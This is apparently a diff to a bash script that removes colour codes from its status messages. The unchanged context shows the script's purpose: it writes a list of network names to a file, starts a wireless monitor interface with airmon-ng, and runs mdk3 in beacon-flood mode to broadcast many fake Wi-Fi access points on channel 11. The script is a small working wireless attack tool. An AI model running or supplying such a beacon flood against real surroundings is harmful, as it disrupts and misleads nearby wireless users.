@@ -91,11 +91,11 @@ networks=(
 
 if [ -f ssid_names ]
 then
-echo -e "\e[1;31mDeleting list of network names\e[0m"
+echo -e "Deleting list of network names"
 rm -f ssid_names
 fi
 
-echo -e "\e[1;32mCreating list of network names\e[0m"
+echo -e "Creating list of network names"
 for i in "${networks[@]}"
 do
 echo $i >> ssid_names
@@ -103,13 +103,13 @@ done
 
 if [[ -n $(airmon-ng | grep mon0) ]]
 then
-echo -e "\e[1;32mMon0 interface exists\e[0m"
+echo -e "Mon0 interface exists"
 else
-echo -e "\e[1;32mStarting AirMon on wlan0\e[0m"
+echo -e "Starting AirMon on wlan0"
 airmon-ng start wlan0
 fi
 
-echo -e "\e[1;32mBegin beacon flood on mon0\e[0m"
+echo -e "Begin beacon flood on mon0"
 mdk3 mon0 b -c 11 -f ssid_names
 ```
 
